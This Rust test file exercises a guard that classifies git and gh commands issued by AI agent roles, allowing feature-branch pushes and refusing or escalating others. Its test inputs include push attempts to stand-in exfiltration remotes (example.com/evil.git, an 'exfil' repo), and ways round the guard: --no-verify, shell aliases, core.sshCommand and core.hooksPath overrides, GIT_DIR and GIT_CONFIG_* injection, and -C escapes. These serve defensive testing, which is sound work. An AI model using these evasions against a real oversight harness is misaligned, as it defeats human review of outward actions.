//! Slice 1 tests for push policy, recorded remotes, 3-way guard classification,
//! git alias/config hardening (Holes 1 & 2), pre-push verification, `[push]` cast
//! config, and `agy` hook push classification.

use std::fs;
use std::io::Cursor;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};
use std::process::ExitCode;
use std::time::Duration;

use backlot_model::event::{EventKind, OUTWARD_ACTION, PushPolicy, RefusalDisposition};

use crate::cli::Env;
use crate::cli_testkit::{CAST_TOML, fixture, git, ok, scratch};
use crate::guard::{apply_env, prepare_role, run_in, run_in_with_stdin};
use crate::guard_rules::{GuardVerdict, classify_command};
use crate::hook::run_io_with_delay;
use crate::runners::agy;
use crate::store;

pub(super) fn argv(words: &[&str]) -> Vec<String> {
    words.iter().map(|s| (*s).to_string()).collect()
}

pub(super) struct GitStudio {
    pub scratch: crate::cli_testkit::Scratch,
    pub env: Env,
    pub bare: PathBuf,
    pub repo: PathBuf,
    pub work: PathBuf,
    pub sdir: PathBuf,
    pub role_dir: PathBuf,
}

pub(super) fn setup_git_studio(cast_toml: &str) -> GitStudio {
    let (scratch, mut env) = scratch();
    let bare = scratch.files.join("bare.git");
    let repo = scratch.files.join("repo");
    fs::create_dir_all(&bare).unwrap();
    git(&bare, &["init", "--bare", "-b", "main"]);
    fs::create_dir_all(&repo).unwrap();
    git(&repo, &["init", "-b", "main"]);
    fs::write(repo.join("f"), "base\n").unwrap();
    git(&repo, &["add", "."]);
    git(&repo, &["commit", "-m", "base"]);
    git(&repo, &["remote", "add", "origin", bare.to_str().unwrap()]);
    git(&repo, &["push", "-u", "origin", "main"]);
    git(&bare, &["symbolic-ref", "HEAD", "refs/heads/main"]);
    git(&repo, &["fetch", "origin"]);
    git(&repo, &["remote", "set-head", "origin", "main"]);

    let cast = fixture(&scratch, "cast.toml", cast_toml);
    ok(
        &env,
        &format!(
            "studio new --title Shop --repo {} --cast {cast}",
            repo.display()
        ),
    );
    let sdir = store::studio_dir(&scratch.dir, "acme-shop");
    let work = sdir.join("work/t1");
    fs::create_dir_all(work.parent().unwrap()).unwrap();
    git(
        &repo,
        &[
            "worktree",
            "add",
            "-b",
            "feat/login",
            work.to_str().unwrap(),
        ],
    );
    fs::write(work.join("f"), "feat\n").unwrap();
    git(&work, &["add", "."]);
    git(&work, &["commit", "-m", "feat"]);

    let role_dir = sdir.join("roles/actor-t1-c1");
    let exe_dir = scratch.files.join("exe");
    fs::create_dir_all(&exe_dir).unwrap();
    let mock_backlot = exe_dir.join("backlot");
    fs::write(
        &mock_backlot,
        "#!/bin/sh\nif [ \"$1\" = \"guard\" ] && [ \"$2\" = \"git\" ]; then\n  shift 3\n  PATH=\"${PATH#*:}\" exec git \"$@\"\nfi\nexit 0\n",
    )
    .unwrap();
    fs::set_permissions(&mock_backlot, fs::Permissions::from_mode(0o755)).unwrap();
    prepare_role(&role_dir, exe_dir.to_str().unwrap()).unwrap();
    env.vars.insert("BACKLOT_ROLE".into(), "actor-t1-c1".into());
    env.vars.insert("BACKLOT_TASK".into(), "t1".into());
    let base_path = std::env::var("PATH").unwrap_or_else(|_| "/usr/bin:/bin".into());
    apply_env(
        &mut env.vars,
        &role_dir,
        exe_dir.to_str().unwrap(),
        &base_path,
        None,
    );

    GitStudio {
        scratch,
        env,
        bare,
        repo,
        work,
        sdir,
        role_dir,
    }
}

pub(super) fn studio_policy(sdir: &Path) -> PushPolicy {
    store::load_state(sdir).unwrap().studio.unwrap().push
}

#[test]
fn hole1_recorded_remote_feature_branch_allows_and_fast_path_skips_ledger() {
    let gs = setup_git_studio(CAST_TOML);
    assert!(gs.role_dir.join("git-hooks/pre-push").is_file());
    let policy = studio_policy(&gs.sdir);
    assert!(
        policy
            .remotes
            .iter()
            .any(|r| r.name == "origin" && r.url == gs.bare.to_string_lossy()),
        "studio.created must record origin push URL: {:?}",
        policy.remotes
    );

    // Feature branch push to recorded remote succeeds via guard::run_in.
    let (code, msg) = run_in(
        &argv(&["git", "--", "push", "-u", "origin", "feat/login"]),
        &gs.env,
        &gs.work,
        false,
    );
    assert_eq!(code, ExitCode::SUCCESS, "msg={msg:?}");
    assert!(msg.is_none());
    assert!(
        !git(
            &gs.bare,
            &["rev-parse", "--verify", "refs/heads/feat/login"]
        )
        .is_empty(),
        "bare repo must receive feat/login"
    );

    // Non-push git uses fast path with zero ledger I/O (corrupting ledger doesn't break git status).
    let raw_events = fs::read_to_string(gs.sdir.join("events.jsonl")).unwrap();
    fs::write(gs.sdir.join("events.jsonl"), "{corrupt\n").unwrap();
    let (st_code, st_msg) = run_in(&argv(&["git", "--", "status"]), &gs.env, &gs.work, false);
    fs::write(gs.sdir.join("events.jsonl"), raw_events).unwrap();
    assert_eq!(st_code, ExitCode::SUCCESS, "fast path failed: {st_msg:?}");
}

#[test]
fn hole1_new_remote_and_mutated_origin_and_legacy_empty_remotes_become_card() {
    let gs = setup_git_studio(CAST_TOML);
    let exfil = gs.scratch.files.join("exfil.git");
    fs::create_dir_all(&exfil).unwrap();
    git(&exfil, &["init", "--bare", "-b", "main"]);
    let exfil_url = exfil.to_string_lossy().into_owned();

    // 1. Role adds a new remote and tries to push to it -> Card with URL.
    let (add_code, _) = run_in(
        &argv(&["git", "--", "remote", "add", "exfil", &exfil_url]),
        &gs.env,
        &gs.work,
        false,
    );
    assert_eq!(add_code, ExitCode::SUCCESS);

    let (code, msg) = run_in(
        &argv(&["git", "--", "push", "exfil", "feat/login"]),
        &gs.env,
        &gs.work,
        false,
    );
    assert_eq!(code, ExitCode::from(126));
    let msg = msg.expect("card refusal message");
    assert!(msg.contains("sent to the person as a card"), "{msg}");
    assert!(msg.contains(&exfil_url), "{msg}");
    assert_eq!(git(&exfil, &["rev-list", "--all"]), "");

    // 2. Mutated origin URL, pushurl, insteadOf -> Card with new URL.
    let evil_url = "https://example.com/evil.git";
    git(&gs.repo, &["remote", "set-url", "origin", evil_url]);
    let (code, msg) = run_in(
        &argv(&["git", "--", "push", "origin", "feat/login"]),
        &gs.env,
        &gs.work,
        false,
    );
    assert_eq!(code, ExitCode::from(126));
    let msg = msg.unwrap();
    assert!(msg.contains("unrecorded remote URL"), "{msg}");
    assert!(msg.contains(evil_url), "{msg}");

    // Restore origin, set pushurl.
    git(
        &gs.repo,
        &["remote", "set-url", "origin", gs.bare.to_str().unwrap()],
    );
    let pushurl = "https://example.com/pushurl-evil.git";
    git(&gs.repo, &["config", "remote.origin.pushurl", pushurl]);
    let (code, msg) = run_in(
        &argv(&["git", "--", "push", "origin", "feat/login"]),
        &gs.env,
        &gs.work,
        false,
    );
    assert_eq!(code, ExitCode::from(126));
    let msg = msg.unwrap();
    assert!(msg.contains("unrecorded remote URL"), "{msg}");
    assert!(msg.contains(pushurl), "{msg}");
    git(&gs.repo, &["config", "--unset", "remote.origin.pushurl"]);

    // insteadOf rewrite.
    git(
        &gs.repo,
        &[
            "config",
            "url.https://example.com/insteadof/.insteadOf",
            gs.bare.to_str().unwrap(),
        ],
    );
    let (code, msg) = run_in(
        &argv(&["git", "--", "push", "origin", "feat/login"]),
        &gs.env,
        &gs.work,
        false,
    );
    assert_eq!(code, ExitCode::from(126));
    let msg = msg.unwrap();
    assert!(msg.contains("unrecorded remote URL"), "{msg}");
    assert!(msg.contains("https://example.com/insteadof/"), "{msg}");

    // Verify no outward action attention was raised for Card verdicts.
    let (events, _) = store::load_events(&gs.sdir).unwrap();
    assert!(
        events.iter().any(|e| matches!(
            &e.kind,
            EventKind::RoleRefused {
                disposition: RefusalDisposition::Card,
                ..
            }
        )),
        "expected RoleRefused with disposition=Card"
    );
    assert!(
        events.iter().all(|e| !matches!(
            &e.kind,
            EventKind::AttentionRaised { reason, .. } if reason == OUTWARD_ACTION
        )),
        "Card verdicts must not raise outward action attention"
    );

    // 3. Legacy studio with empty remotes -> Card.
    let legacy = PushPolicy::default();
    assert!(legacy.remotes.is_empty());
    let v = classify_command(
        "git",
        &argv(&["push", "origin", "feat/login"]),
        &legacy,
        &gs.work,
        &gs.env,
    );
    assert!(matches!(v, GuardVerdict::Card { .. }), "got {v:?}");
}

#[test]
fn protected_branches_tags_all_and_gh_pr_classification() {
    let gs = setup_git_studio(CAST_TOML);
    let policy = studio_policy(&gs.sdir);
    git(&gs.work, &["tag", "v1.0"]);

    for (args, expected_rule) in [
        (&["push", "origin", "main"][..], "protected branch 'main'"),
        (
            &["push", "origin", "HEAD:release/v2"][..],
            "protected branch 'release*'",
        ),
        (&["push", "origin", "v1.0"][..], "tag push"),
        (&["push", "--tags", "origin"][..], "tag push"),
        (
            &["push", "--all", "origin"][..],
            "pushes all local branches",
        ),
    ] {
        let v = classify_command("git", &argv(args), &policy, &gs.work, &gs.env);
        match v {
            GuardVerdict::Card { rule, .. } => {
                assert!(rule.contains(expected_rule), "args={args:?} rule={rule}")
            }
            other => panic!("expected Card for {args:?}, got {other:?}"),
        }
    }

    // Remote default branch (origin/HEAD -> prod, when prod isn't in protected_branches).
    git(&gs.bare, &["branch", "prod", "main"]);
    git(&gs.bare, &["symbolic-ref", "HEAD", "refs/heads/prod"]);
    git(&gs.work, &["fetch", "origin"]);
    git(&gs.work, &["remote", "set-head", "origin", "prod"]);
    let v = classify_command(
        "git",
        &argv(&["push", "origin", "HEAD:prod"]),
        &policy,
        &gs.work,
        &gs.env,
    );
    assert!(
        matches!(&v, GuardVerdict::Card { rule, .. } if rule.contains("remote default branch 'prod'")),
        "got {v:?}"
    );

    // gh pr create -> Card; gh pr view/list/checks -> Allow; gh pr merge -> Refuse.
    assert!(matches!(
        classify_command(
            "gh",
            &argv(&["pr", "create", "--title", "Add auth"]),
            &policy,
            &gs.work,
            &gs.env
        ),
        GuardVerdict::Card { .. }
    ));
    for ro in ["view", "list", "status", "diff", "checks"] {
        assert_eq!(
            classify_command("gh", &argv(&["pr", ro]), &policy, &gs.work, &gs.env),
            GuardVerdict::Allow,
            "gh pr {ro} should Allow"
        );
    }
    assert!(matches!(
        classify_command(
            "gh",
            &argv(&["pr", "merge", "42"]),
            &policy,
            &gs.work,
            &gs.env
        ),
        GuardVerdict::Refuse { .. }
    ));
}

#[test]
fn hole2_always_refuse_flags_aliases_hookspath_and_escaping_paths() {
    let gs = setup_git_studio(CAST_TOML);
    let policy = studio_policy(&gs.sdir);

    for args in [
        &["push", "--force", "origin", "feat/login"][..],
        &["push", "--force-with-lease", "origin", "feat/login"][..],
        &["push", "origin", "+feat/login:feat/login"][..],
        &["push", "origin", ":feat/login"][..],
        &["push", "-d", "origin", "feat/login"][..],
        &["push", "--mirror", "origin"][..],
        &["push", "--no-verify", "origin", "feat/login"][..],
        &["-c", "core.sshCommand=evil", "push", "origin", "feat/login"][..],
        &["-c", "core.hooksPath=/dev/null", "status"][..],
    ] {
        let v = classify_command("git", &argv(args), &policy, &gs.work, &gs.env);
        assert!(
            matches!(v, GuardVerdict::Refuse { .. }),
            "expected Refuse for {args:?}, got {v:?}"
        );
    }

    // Aliases: plain and `!` shell aliases.
    git(&gs.repo, &["config", "alias.p", "push --no-verify"]);
    git(&gs.repo, &["config", "alias.pf", "push"]);
    git(
        &gs.repo,
        &[
            "config",
            "alias.sp",
            "!git push --no-verify origin feat/login",
        ],
    );
    git(&gs.repo, &["config", "alias.sc", "!git push origin main"]);
    git(&gs.repo, &["config", "alias.sb", "!echo $BACKLOT_ROLE"]);
    git(&gs.repo, &["config", "alias.su", "!git push 'unclosed"]);

    let v_p = classify_command(
        "git",
        &argv(&["p", "origin", "main"]),
        &policy,
        &gs.work,
        &gs.env,
    );
    assert!(
        matches!(&v_p, GuardVerdict::Refuse { rule, .. } if rule.contains("--no-verify") && rule.contains("alias 'p'")),
        "got {v_p:?}"
    );
    let v_pf = classify_command(
        "git",
        &argv(&["pf", "origin", "main"]),
        &policy,
        &gs.work,
        &gs.env,
    );
    assert!(
        matches!(&v_pf, GuardVerdict::Card { rule, .. } if rule.contains("protected branch 'main'") && rule.contains("alias 'pf'")),
        "got {v_pf:?}"
    );
    assert!(matches!(
        classify_command("git", &argv(&["sp"]), &policy, &gs.work, &gs.env),
        GuardVerdict::Refuse { .. }
    ));
    assert!(matches!(
        classify_command("git", &argv(&["sc"]), &policy, &gs.work, &gs.env),
        GuardVerdict::Card { .. }
    ));
    assert!(matches!(
        classify_command("git", &argv(&["sb"]), &policy, &gs.work, &gs.env),
        GuardVerdict::Refuse { .. }
    ));
    assert!(matches!(
        classify_command("git", &argv(&["su"]), &policy, &gs.work, &gs.env),
        GuardVerdict::Refuse { .. }
    ));

    // Tampered core.hooksPath.
    git(&gs.repo, &["config", "core.hooksPath", "/dev/null"]);
    let (code_hp, msg_hp) = run_in(
        &argv(&["git", "--", "push", "origin", "feat/login"]),
        &gs.env,
        &gs.work,
        false,
    );
    assert_eq!(code_hp, ExitCode::from(126));
    assert!(
        msg_hp.as_deref().unwrap_or("").contains("hooksPath"),
        "{msg_hp:?}"
    );
    git(&gs.repo, &["config", "--unset", "core.hooksPath"]);

    // Escaping GIT_DIR / GIT_CONFIG_* / -C.
    let outside = gs.scratch.files.join("outside");
    fs::create_dir_all(&outside).unwrap();
    git(&outside, &["init", "-b", "main"]);
    let mut esc_env = Env {
        vars: gs.env.vars.clone(),
    };
    esc_env.vars.insert(
        "GIT_DIR".into(),
        outside.join(".git").to_string_lossy().into(),
    );
    assert!(matches!(
        classify_command("git", &argv(&["status"]), &policy, &gs.work, &esc_env),
        GuardVerdict::Refuse { rule, .. } if rule.contains("outside work area")
    ));

    let mut cfg_env = Env {
        vars: gs.env.vars.clone(),
    };
    cfg_env.vars.insert("GIT_CONFIG_COUNT".into(), "1".into());
    cfg_env
        .vars
        .insert("GIT_CONFIG_KEY_0".into(), "core.sshCommand".into());
    cfg_env
        .vars
        .insert("GIT_CONFIG_VALUE_0".into(), "evil".into());
    assert!(matches!(
        classify_command(
            "git",
            &argv(&["push", "origin", "feat/login"]),
            &policy,
            &gs.work,
            &cfg_env
        ),
        GuardVerdict::Refuse { .. }
    ));

    // Escaping `-C /outside` is refused with role_dir context.
    let (code_c, msg_c) = run_in(
        &argv(&[
            "git",
            "--",
            "-C",
            outside.to_str().unwrap(),
            "push",
            "origin",
            "feat/login",
        ]),
        &gs.env,
        &gs.work,
        false,
    );
    assert_eq!(code_c, ExitCode::from(126));
    assert!(
        msg_c.as_deref().unwrap_or("").contains("outside work area"),
        "{msg_c:?}"
    );
}

#[test]
fn pre_push_hook_checks_url_non_ff_delete_and_allows_recorded_ff() {
    let gs = setup_git_studio(CAST_TOML);
    let bare_url = gs.bare.to_string_lossy().into_owned();
    let c1 = git(&gs.work, &["rev-parse", "HEAD"]);
    let zero = "0".repeat(40);

    // 1. FF push of feature branch to recorded URL -> Allow (exit 0).
    let (code, msg) = run_in_with_stdin(
        &argv(&["git-push", "--", "origin", &bare_url]),
        &gs.env,
        &gs.work,
        false,
        &format!("refs/heads/feat/login {c1} refs/heads/feat/login {zero}\n"),
    );
    assert_eq!(code, ExitCode::SUCCESS, "msg={msg:?}");

    // Push c1, then amend locally to create non-FF c2.
    git(&gs.repo, &["push", "origin", "feat/login"]);
    fs::write(gs.work.join("f"), "amended\n").unwrap();
    git(&gs.work, &["add", "."]);
    git(&gs.work, &["commit", "--amend", "-m", "amended"]);
    let c2 = git(&gs.work, &["rev-parse", "HEAD"]);

    // 2. Non-FF -> Refuse (exit 126).
    let (code_nff, msg_nff) = run_in_with_stdin(
        &argv(&["git-push", "--", "origin", &bare_url]),
        &gs.env,
        &gs.work,
        false,
        &format!("refs/heads/feat/login {c2} refs/heads/feat/login {c1}\n"),
    );
    assert_eq!(code_nff, ExitCode::from(126));
    assert!(
        msg_nff
            .as_deref()
            .unwrap_or("")
            .contains("non-fast-forward"),
        "{msg_nff:?}"
    );

    // 3. Delete -> Refuse (exit 126).
    let (code_del, _) = run_in_with_stdin(
        &argv(&["git-push", "--", "origin", &bare_url]),
        &gs.env,
        &gs.work,
        false,
        &format!("(delete) {zero} refs/heads/feat/login {c1}\n"),
    );
    assert_eq!(code_del, ExitCode::from(126));

    // 4. Unrecorded URL -> exit 126 (Card).
    let (code_url, msg_url) = run_in_with_stdin(
        &argv(&["git-push", "--", "exfil", "https://example.com/evil.git"]),
        &gs.env,
        &gs.work,
        false,
        &format!("refs/heads/feat/login {c2} refs/heads/feat/login {zero}\n"),
    );
    assert_eq!(code_url, ExitCode::from(126));
    assert!(
        msg_url
            .as_deref()
            .unwrap_or("")
            .contains("unrecorded remote URL"),
        "{msg_url:?}"
    );
}

#[test]
fn custom_push_in_cast_toml_and_agy_hook_classification() {
    let custom_cast = format!(
        "{CAST_TOML}\n[push]\nprotected_branches = [\"main\", \"prod\"]\nprotect_tags = false\nprotect_default_branch = false\n"
    );
    let gs = setup_git_studio(&custom_cast);
    let policy = studio_policy(&gs.sdir);
    assert_eq!(policy.protected_branches, vec!["main", "prod"]);
    assert!(!policy.protect_tags);
    assert!(!policy.protect_default_branch);

    // `release/v2` and tags are allowed under custom policy; `prod` is Card.
    assert_eq!(
        classify_command(
            "git",
            &argv(&["push", "origin", "HEAD:release/v2"]),
            &policy,
            &gs.work,
            &gs.env
        ),
        GuardVerdict::Allow
    );
    git(&gs.work, &["tag", "v1.0"]);
    assert_eq!(
        classify_command(
            "git",
            &argv(&["push", "origin", "v1.0"]),
            &policy,
            &gs.work,
            &gs.env
        ),
        GuardVerdict::Allow
    );
    assert!(matches!(
        classify_command(
            "git",
            &argv(&["push", "origin", "HEAD:prod"]),
            &policy,
            &gs.work,
            &gs.env
        ),
        GuardVerdict::Card { .. }
    ));

    // agy settings omit static git push / gh pr deny rules.
    let settings = String::from_utf8(agy::settings_content(None, None).unwrap()).unwrap();
    assert!(!settings.contains("command(git push)"), "{settings}");
    assert!(!settings.contains("command(gh pr)"), "{settings}");
    assert!(settings.contains("command(gh release)"), "{settings}");

    // agy hook classifies recorded feature push -> allow, protected -> deny (Card, no attention), force -> deny (Refused + attention).
    let sig = gs.scratch.files.join("agy-signals.jsonl");
    let hargs = vec![
        "--runner".into(),
        "agy".into(),
        "--file".into(),
        sig.to_string_lossy().into_owned(),
    ];
    let run_agy = |cmd: &str| {
        let payload = serde_json::json!({
            "conversationId": "c1",
            "hookEventName": "PreToolUse",
            "toolCall": { "name": "run_command", "args": { "CommandLine": cmd } }
        })
        .to_string();
        let mut out = Vec::new();
        let (code, done) = run_io_with_delay(
            &hargs,
            &gs.env,
            &gs.work,
            Duration::from_millis(1500),
            None,
            &mut Cursor::new(payload.as_bytes()),
            &mut out,
        );
        done.recv_timeout(Duration::from_secs(5)).unwrap();
        assert_eq!(code, ExitCode::SUCCESS);
        serde_json::from_slice::<serde_json::Value>(&out).unwrap()
    };

    assert_eq!(run_agy("git push origin feat/login")["decision"], "allow");
    let card_res = run_agy("git push origin main");
    assert_eq!(card_res["decision"], "deny");
    assert!(
        card_res["reason"]
            .as_str()
            .unwrap()
            .contains("sent to the person as a card"),
        "{card_res}"
    );
    let (events, _) = store::load_events(&gs.sdir).unwrap();
    assert!(events.iter().all(|e| !matches!(
        &e.kind,
        EventKind::AttentionRaised { reason, .. } if reason == OUTWARD_ACTION
    )));

    let ref_res = run_agy("git push --force origin feat/login");
    assert_eq!(ref_res["decision"], "deny");
    let (events, _) = store::load_events(&gs.sdir).unwrap();
    assert!(events.iter().any(|e| matches!(
        &e.kind,
        EventKind::AttentionRaised { reason, .. } if reason == OUTWARD_ACTION
    )));
}
